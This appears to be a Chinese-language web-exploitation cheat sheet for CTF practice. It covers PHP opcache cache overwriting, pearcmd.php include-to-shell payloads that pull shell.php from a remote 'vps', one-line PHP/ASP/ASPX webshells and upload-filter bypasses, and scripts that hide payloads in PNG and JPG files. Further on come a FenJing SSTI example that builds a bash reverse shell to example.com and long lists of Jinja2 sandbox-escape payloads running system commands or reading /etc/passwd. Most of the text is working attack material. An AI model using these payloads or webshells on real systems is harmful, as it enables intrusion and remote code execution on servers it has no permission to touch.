        zend_bin_id = "BIN_" + bin_id_suffix
    else:
        zend_bin_id = "BIN_SIZEOF_CHAR" + bin_id_suffix

    # Alternate Bin ID, see #5
    alt_zend_bin_id = None
    alt_digest = None
    if not php_greater_74:
        if architecture == "x86_64":
            alt_bin_id_suffix = "148888"
        else:
            alt_bin_id_suffix = "144444"
        alt_zend_bin_id = "BIN_" + alt_bin_id_suffix

    # Logging
    print("PHP version      : " + php_version)
    print("Zend Extension ID: " + zend_extension_id)
    print("Zend Bin ID      : " + zend_bin_id)
    print("Assuming " + architecture + " architecture")

    digest = md5(php_version + zend_extension_id + zend_bin_id)
    print("------------")
    print("System ID        : " + digest)

    if not php_greater_74:
        alt_digest = md5(php_version + zend_extension_id + alt_zend_bin_id)
        print("PHP lower than 7.4 detected, an alternate Bin ID is possible:")
        print("Alternate Zend Bin ID : " + alt_zend_bin_id)
        print("Alternate System ID   : " + alt_digest)

if __name__ == "__main__":
    main()

```

计算了 system_id 

<!-- 这是一张图片，ocr 内容为：C:/USERS/HK/DESKTOP/PYTHONMISC/PHP 7_OPCACHE.PY [FILELURL] C/PHP_7. PS C:UUSERSUTRIDESKTOP(EYTHONSIENSTTOP/EYTHON/BYTHON/BYTHON39/DYTHON.EXE C://USERSKTOP/ETONSISE(PHD OPCACHE.PY HTTP://RCELABS.XXX:8122//FILE-PHPINFO 7.0.33 PHP VERSION ZEND EXTENSION ID: API320151012,NTS BIN SIZEOF CHAR4888 ZEND BIN ID ASSUMING X86 64 ARCHITECTURE 0B8BD94E9858E5D32D058DC0ACF75014 SYSTEM ID LOWER THAN 7.4 DETECTED, AN ALTERNATE BIN ID IS POSSIBLE: PHP LOWE ALTERNATE ZEND BIN ID : BIN 14888 ALTERNATE SYSTEM ID PS C:\USERS\HK\DESKTOP\PYTHONMISC> -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1780600829786-235a827d-96d5-47bc-b846-00c20426a07e.png)

本地也器开启 opcache 并创建一个 shell 的 index.php  并访问，此时本地 opcache 的缓存有了 index.php

将本地缓存替换掉内部的 systemid 并覆盖靶机的 index.php.bin，此时访问靶机 index.php 发现可以 RCE

## pearcmd.php 利用
[https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

<!-- 这是一张图片，ocr 内容为：4096K REALPATH_CACHE_SIZE 4096K 120 120 REALPATH_CACHE TTL ON ON REGISTER_ARGC_ARGV ON ON REPORT_MEMLEAKS ANART 70ND DABUG -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1780601597779-65e70581-8810-4467-abc8-a7d762c37f9f.png)

如果 register_argc_argv 开启则命令行和网页可以转成参数 分隔符为 + 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1780601624749-603c27e8-47bf-4624-85f4-978685a41dd3.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1780601618375-946cc541-636d-4515-b784-0b8443dddb26.png)

pear 的位置 在 /[usr/share/php/pearcmd.php](http://usr/share/php/pearcmd.php/usr/share/php/pearcmd.php)

pear 有命令 pear install -R /tmp [http://vps/shell.php](http://vps/shell.php) 可以拉去 shell.php 到本地

那么有 payload

```plain
http://localhost/test.php?file=/usr/share/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.php
```

即包含了 /usr/share/php/pearcmd.php，pearcmd 当执行 pear 后又 把$_SERVER['argv'] 当作参数，网页版 +install+-R+/tmp+[http://vps/shell.php](http://vps/shell.php) 会分割为 install -R /tmp /shell.php，即完整命令

```bash
pear install -R /tmp /shell.php
```

此时包含[/tmp/pear/download/shell.php](http://tmp/pear/download/shell.php) 即可



方法二：创建文件

```plain
?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

即

```plain
pear config-creat /tmp/hello.php <?=phpinfo()?> /tmp/hello.php
```

创建文件 <? 前一定要加 /

```plain
?+config-create+/<?=phpinfo()?>+/var/www/html/shell 
```

# 文件上传
## 文件上传 一句话木马
```plain
<?php @eval($_POST['pass']);?> #php @表示执行错误也不报错
<%eval request ("pass")%> #asp
<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>#aspx
```

## 文件上传 文件后缀绕过
MIME 绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1710327090247-968e2881-636b-4142-8d4e-790c617e04be.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_750%2Climit_0)

```plain
前端js判断是否为图片利用抓包修改文件名
判断content-type，于是修改content-type绕过，详细在该段后

# 扩展名绕过：
  apache & nginx
    PHP: php2 php3 php5 phtml pht phps
  tomacat & weblogic
    JSP jsp jspx jspf

  II2
    ASPX: ascx ashx asac 
  

# Apache
	htaccess解析漏洞
  	.htaccess文件，将所有文件解析为php #指定格式文件以php形式解析
  	AddType application/x-httpd-php .jpg
  
	解析漏洞：
  	文件当被.分割时候，将会持续向左看，直到碰撞出合法后缀为止
  	shell.png.php -> 碰撞出  shell.png，但是实际上传为 .php

	换行解析漏洞

# Apache，Nginx （FastCGI 模式，如 phpstudy）
  .user.ini #目录下自定义php.ini
  auto_prepend_file = filename #包含在文件头
  auto_append_file = filename #包含在文件尾
  auto_prepend_file=shell.gif
  # 如果目录中有php文件，将指定文件包含在php文件中，例如index.php

# 双层 url 绕过
  编辑两层 URL 仅限绕过
  
# .php%00.jpg %00截断绕过
  info.phP 大小写绕过
  info.php 后缀名中加空格绕过

# 空格绕过（windows下会自动删除文件名格式空格）
  php 

# 双写绕过(str_ireplace只会替换一次字符)
  phpphp

# 大小写绕过
  linux对大小写敏感
  windows对大小写不敏感

# 特殊
  info.php. 后缀加“.”绕过【利用windows特性，会自动去掉后缀名中最后的”.”】
  (Linux中无效)

  info.php. 后缀加“_”绕过【利用windows特性，会自动去掉后缀名中最后的”.”】
  (Linux中无效)

  info.php  后缀加“ ”绕过【利用windows特性，会自动去掉后缀名中最后的”.”】
  (Linux中无效)

  info.php::$data 利用这个特性将后缀改为.php::$data可以直接绕过检查(Linux无效)
```

## 文件上传 内容绕过
```plain
<?php @eval($_POST['pass']);?> #php @表示执行错误也不报错
<%eval request ("pass")%> #asp
<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>#aspx

# php绕过
  <?php @eval($_POST['hack']);?>
  <? @eval($_POST['hack']);?>
  <?= eval($_POST['hack']);?>
  <? eval($_POST['hack']);?>
  <% eval($_POST['hack']);%>
  其他多种代码风格 比如 <script> 绕过 ?

# 长度绕过
  可缩减内容：
    <?php -> <?
    去除闭合 ?>
    ` ` 直接反引号执行代码

# GIF89a
  GIF89a
  <script language="php">eval($_POST['a']);</script>

# 条件竞争：
  尝试多线程上传shell代码，使其判断前就被执行
  利用思路：<?php fputs(fopen('Tony.php','w'),'<?php @eval($_POST["Tony"])?>');?>
  python循环访问，防止代码处理后删除了图片

# 若是可以文件包含
  # 直接添加文件
  # 二次渲染绕过
```



## 文件上传 重渲染
png 重渲染（CRC 校验）

```php
PHP
  <?php
  $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
             0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
             0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
             0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
             0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
             0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
             0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
             0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
  $r = $p[$y];
  $g = $p[$y+1];
  $b = $p[$y+2];
  $color = imagecolorallocate($img, $r, $g, $b);
  imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'1.png');  //要修改的图片的路径

/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */
//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在
//会在目录下自动创建一个1.png图片
//图片脚本内容：$_GET[0]($_POST[1]);
//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php
?>

```

jpg 重渲染

```php
<?php
  /*
将有效载荷注入JPG图像的算法，该算法在PHP函数imagecopyresized()和imagecopyresampled()引起的变换后保持不变。
初始图像的大小和质量必须与处理后的图像的大小和质量相同。
1)通过安全文件上传脚本上传任意图像
2)保存处理后的图像并启动:
php 文件名.php <文件名.jpg >
如果注射成功，您将获得一个特制的图像，该图像应再次上传。
由于使用了最直接的注射方法，可能会出现以下问题:
1)在第二次处理之后，注入的数据可能变得部分损坏。
jpg _ payload.php脚本输出“有问题”。
如果发生这种情况，请尝试更改有效载荷(例如，在开头添加一些符号)或尝试另一个初始图像。
谢尔盖·博布罗夫@Black2Fan。
另请参见:
https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chunks/
*/

  $miniPayload = '<?=eval($_POST[1]);?>';


if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
  die('php-gd is not installed');
}

if(!isset($argv[1])) {
  die('php jpg_payload.php <jpg_name.jpg>');
}

set_error_handler("custom_error_handler");

for($pad = 0; $pad < 1024; $pad++) {
  $nullbytePayloadSize = $pad;
  $dis = new DataInputStream($argv[1]);
  $outStream = file_get_contents($argv[1]);
  $extraBytes = 0;
  $correctImage = TRUE;

  if($dis->readShort() != 0xFFD8) {
    die('Incorrect SOI marker');
  }

  while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
    $marker = $dis->readByte();
    $size = $dis->readShort() - 2;
    $dis->skip($size);
    if($marker === 0xDA) {
      $startPos = $dis->seek();
      $outStreamTmp = 
        substr($outStream, 0, $startPos) . 
        $miniPayload . 
        str_repeat("\0",$nullbytePayloadSize) . 
        substr($outStream, $startPos);
      checkImage('_'.$argv[1], $outStreamTmp, TRUE);
      if($extraBytes !== 0) {
        while((!$dis->eof())) {
          if($dis->readByte() === 0xFF) {
            if($dis->readByte !== 0x00) {
              break;
            }
          }
        }
        $stopPos = $dis->seek() - 2;
        $imageStreamSize = $stopPos - $startPos;
        $outStream = 
          substr($outStream, 0, $startPos) . 
          $miniPayload . 
          substr(
            str_repeat("\0",$nullbytePayloadSize).
            substr($outStream, $startPos, $imageStreamSize),
            0,
            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
          substr($outStream, $stopPos);
      } elseif($correctImage) {
        $outStream = $outStreamTmp;
      } else {
        break;
      }
      if(checkImage('payload_'.$argv[1], $outStream)) {
        die('Success!');
      } else {
        break;
      }
    }
  }
}
unlink('payload_'.$argv[1]);
die('Something\'s wrong');

function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

## 文件上传 PHP四种代码风格
```plain
# XML 风格
<?php
  eval($_POST['cmd']); 
?>

# 脚本 风格
<script language="php">
  eval($_POST['cmd']);
</script>

# 简短风格
<? 
eval($_POST['cmd']);
?>

# ASP风格
<% 
  eval($_POST['cmd']);
%>
```

# SSTI 模板注入
## FenJing
```plain
Usage: python -m fenjing scan [OPTIONS]

  扫描指定的网站

Options:
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  --help                          Show this message and exit.

Usage: python -m fenjing crack [OPTIONS]

  攻击指定的表单

Options:
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  -a, --action TEXT               参数的提交路径，如果和URL中的路径不同则需要填入
  -m, --method TEXT               参数的提交方式，默认为POST
  -i, --inputs TEXT               所有参数，以逗号分隔  [required]
  --eval-args-payload             是否开启在GET参数中传递Eval payload的功能
  --help                          Show this message and exit.

Usage: python -m fenjing crack-request [OPTIONS]

  从文本文件中读取请求并攻击目标，文本文件中用`PAYLOAD`标记payload插入位置

Options:
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  -h, --host TEXT                 目标的host，可为IP或域名  [required]
  -p, --port INTEGER              目标的端口  [required]
  -f, --request-file TEXT         保存在文本文件中的请求，其中payload处为PAYLOAD  [required]
  --toreplace BYTES               请求文件中payload的占位符
  --ssl / --no-ssl                是否使用SSL
  --urlencode-payload BOOLEAN     是否对payload进行urlencode
  --raw                           不检查请求的换行符等
  --retry-times INTEGER           重试次数
  --help                          Show this message and exit.

Usage: python -m fenjing crack-path [OPTIONS]

  攻击指定的路径

Options:
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  --help                          Show this message and exit.

Usage: python -m fenjing webui [OPTIONS]

  启动webui

Options:
  -h, --host TEXT                 需要监听的host, 默认为127.0.0.1
  -p, --port INTEGER              需要监听的端口, 默认为11451
  --open-browser / --no-open-browser
                                  是否自动打开浏览器
  --help                          Show this message and exit.


# example.py
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    print(f"{config_payload=}")

```

## SSTI 的触发说明
```python
# 不可触发，因为其是被作为参数进行传参进去
@app.route('/ssti',methods=['GET'])
def ssti():
    input = request.args.get('input')
    template = "{{ input }}"
    return render_template_string(template,input=input)


# 可以触发，当他作为整句进行渲染时，可以执行模板内容
@app.route('/ssti',methods=['GET'])
def ssti():
    input = request.args.get('input')
    template = "{{ " + input + " }}"
    return render_template_string(template,input=input)
```

## SSTI 常见模板类型
```plain
SSTI 特征
  Werkzeug/0.15.5 Python/2.7.16
说明：
  SSTI 渲染模板的时候，可以执行 {{ 代码 }} ，其中如果已经有 {{ %s }} 时候，则不需要自己填充 {}
  因为他只能一次渲染，比如 {{ 1+1 }} 只能在第一次渲染字符串 {{ 1+1 }} 执行
  
flask
  {% ... %} for Statements
    {% 7*7 %}
    {%if(SSTI记得外带数据，输出)%}1{%endif%}
  {{ ... }} for Expressions to print to the template output
  {# ... #} for Comments not included in the template output
  \# ... ## for Line Statements

smarty
  {{ ... }} 但是内容需要执行为php代码
```

## SSTI 基础 内建模块 builtins/builtin/builtins
```plain
import __builtin__  # python2
import builtins  # python3

dir(__builtins__) # 查看内部可用函数

'__import__' in dir(__builtins__) # 判断是否在__builtins__库中
如果库中被删除，可以尝试: 
reload(__builtins__) # python2

import imp
imp.reload(__builtins__) # python3

#执行命令：通过内建模块添加os模块列表执行命令
__builtins__.__dict__['__import__']('os').system('command')
```

## SSTI 魔术方法
```plain
__class__        # 返回调用的参数类型
__base__         # 以字符串返回一个类所直接继承的第一个类，一般情况下是object
__bases__        # 以元组的形式返回基类
__mro__          # 返回解析方法调用的顺序
__subclasses__() # 返回子类列表
__globals__      # 以字典的形式返回函数所在的全局命名空间所定义的全局变量
__import__       # 导入模块
__builtins__     # 内建模块的引用，在任何地方都是可见的(包括全局)，这个模块包括了很多强大的内置函数，如eval, exec, fopen等
__getitem__      # 提取元素
```

## SSTI 触发函数
```plain
render_template_string
```

## SSTI JINJA2的内置函数
```plain
# jinja2
  jinja2一共有3个内置的全局函数：range、lipsum、dict，其中只有lipsum有__globals__键
  
# flask 
  flask提供了两个内置的全局函数：url_for、get_flashed_messages，两个都有__globals__键；

  # flask
    {{get_flashed_messages.__globals__['os'].popen('whoami').read()}}
    {{url_for.__globals__['os'].popen('whoami').read()}}
# jinja2
    {{lipsum.__globals__['os'].popen('whoami').read()}}
# 另外两个内置函数和正常逃逸一个思路
```

## SSTI 继承关系逃逸原理 以及 利用 
<!-- 这是一张图片，ocr 内容为：OBJECT SUBCLASSES BASE CLASS CLASS CLASS CLASS CLASS CLASS () [] -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1731636281515-8df42318-48a4-4163-b3d2-8f2381d4fb22.png)

```plain
# 理解知识点
  __是魔法方法，以避免与其它函数名发生冲突

# 若是dir()可用时，可以多次查看属性和函数列表
  __mro__   __subclasses__() __base__ 是在dir()中不显示的，是魔法属性，需要自己尝试

# dir __dict__ 显示下属属性和函数列表
  ''.__class__.__dict__['upper']
  dir(''.__class__)

#mro的意思是方法解析顺类，从子类到父类
  ''.__class__.__mro__  
  >>> (<class 'str'>, <class 'object'>)

# '' 是str类继承字object
  ''.__class__.__base__ # 查找父类
  >>>  <class 'object'>)

# subclasses是一个魔法属性显示直接子类
  ''.__class__.__mro__.__subclasses__ 

# __getattribute__ 无条件调用
  object.__getattribute__(self, name)
  __import__(“os”).__getattribute__(“metsys”[::-1])(‘ls’)

# globals继承逃逸，通过一些库自带os之类的模块实现逃逸
  function.func_globals # 返回全局变量子类

# 简单总结
  1.找到子类
    [].__class__ 返回一个空列表所属的类，即list 类。
    .__base__ 和 __mro__ 返回list类的父类，即object类。
    .__subclasses__() 返回object类的所有直接子类。
    [59] 表示获取子类列表中下标为 59 的子类，这里可能因为 Python 解释器版本不同而导致结果不同，具体取决于object类有多少个直接子类。如果在你的 Python 环境中运行此代码时，出现了索引错误或其他异常，请尝试使用不同的索引。
    当找到 os._wrap_close 类后进行初始化方法

  	如果字符被过滤，可以用 [0].__name__ 查看子类名

  2.初始化类（可以想象为调用初始化类的函数）
    .__init__ 是获取该子类的初始化方法，即构造函数，当dir(初始化) 发现 __globals__ 键值时，全局命名空间作为一个字典
    .__globals__ 获取该方法的全局命名空间作为一个字典，包含了该方法所在文件的全局变量和函数等信息。
    即通过 __init__ 方法的全局作用域拿到其他模块的函数
    
    可以直接 .init__.__globals__ 有没有相关函数的键值，不需要使用 dir() ，这个用来看属性的，而popen之类的是键值
    example:
      已经构建好方法后基本可以直接构造函数执行，如果不存再函数可以进一步通过__dict__找到函数再直接执行
      .__init__.__globals__['popen']('ls').read()
      .__init__.__globals__['linecache'].__dict__['os'].system('whoami')
      
    a.如果有popen函数则可以直接执行
      ''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('ls').read()

    b.如果没有popen函数则需要继续
      ['linecache'] 表示获取该文件中名字为linecache的模块。
      .__dict__ 获取该模块的命名空间作为一个字典。
      ['os'] 表示获取该模块中名字为os的变量或模块。
      system('whoami') 调用以'whoami'字符串为参数的os.system()函数。
      [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')

  3.初始化类后但是不能使用['eval']之类的方法或者被过滤后，可以 .__dict__.values()[11] 的方法导入
    	[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')

- 常见利用 ------------------------------
# file 类
	[].__class__.__base__.__subclasses__()[40]('flag').read() 
	[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
	[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
	[].__class__.__base__.__subclasses__()[257]('flag').read() (python3)

# open 类
  ().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['open']('C:\\Windows\win.ini').read()
  [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('whoami').read()
  ().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
  ().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()
  "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("whoami").read()
  "".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()

# os._wrap_close 类的 popen
	"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
	"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()

# os 类的 popen
	[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
	[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()
	[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()
	''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()
	"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
	"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
	"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
	"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
	''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()

# __bulitins__ 类的 file与eval，甚至可以用来导入模块
  __builtins__ 只要包含 __init__.__globals__都可以去尝试
  比如：()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(139)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')

  [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
  [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()

# catch_warnings 类的 eval 补充 func_globals 用法
  # ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.keys() 方法返回其初始化函数的全局作用域（即所有的变量、函数）
  # 里面有 linecache ，使用 func_globals.values() 返回一个字典视图对象，包含了定义在该方法中的所有全局变量和函数。
	().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')
  ()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[117].__init__.__globals__['__buil''tins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")

# site_Printer 类的 os popen执行命令
  {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
  [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()
  [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()

# __import__ 类的 导入 os 模块
  {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

# importlib 类的导入 os 模块
  可以查看 dir(importlib.XXXXXX)
	''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()

# sys 类的 os 模块
  [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].system('whoami')

# lincache 类的 lincache.os.popen 函数
  可以查看 dir(lincache.XXXXXX)
	''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()
	[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()
	[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()

# jinja2 和 flask 的内置函数逃逸
  # jinja2
    jinja2一共有3个内置的全局函数：range、lipsum、dict，其中只有lipsum有__globals__键
    {{lipsum.__globals__['os'].popen('whoami').read()}}
    
  # flask 
    flask提供了两个内置的全局函数：url_for、get_flashed_messages，两个都有__globals__键；
    {{get_flashed_messages.__globals__['os'].popen('whoami').read()}}
    {{url_for.__globals__['os'].popen('whoami').read()}}

# current 那 config
  url_for
    {{url_for.__globals__['current_app'].config}}
  get_flashed_messages
    {{get_flashed_messages.__globals__['current_app'].config}}
  
- 常见函数利用 ----------------------
# eval利用
	['eval']("__import__('os').popen('ls')").read() # eval命令执行
```

## SSTI 绕过
```plain
# 继承关系替换
  # __globals__ 替换
  ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
  ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
  ''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")

  # __mro__、__bases__、__base__互换
  ''.__class__.__mro__[2]
  [].__class__.__mro__[1]
  {}.__class__.__mro__[1]
  ().__class__.__mro__[1]
  [].__class__.__mro__[-1]
  {}.__class__.__mro__[-1]
  ().__class__.__mro__[-1]
  {}.__class__.__bases__[0]
  ().__class__.__bases__[0]
  [].__class__.__bases__[0]
  [].__class__.__base__
  ().__class__.__base__
  {}.__class__.__base__

-------------------------------------------------------------------------------------
# 绕内建函数
  >>> eval('str')
    <class 'str'>
    
  >>> eval('bool')
    <class 'bool'>
    
  >>> eval('st'+'r')
    <class 'str'>
    
  >>> eval(list(dict(s_t_r=1))[0][::2])
    <class 'str'>

-------------------------------------------------------------------------------------
# 绕关键字
# class被过滤 即替换 ['bulitins'] 转为 .__bulitins__ 两者等效
  ['__cla''ss__']

# 内容过滤
  1.unicode
    ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f']('os').popen('whoami').read()

  2.16进制
    ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen('whoami').read()
    
  3.8进制
    ''['\137\137\143\154\141\163\163\137\137'].__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\137\137\151\155\160\157\162\164\137\137']('os').popen('whoami').read()

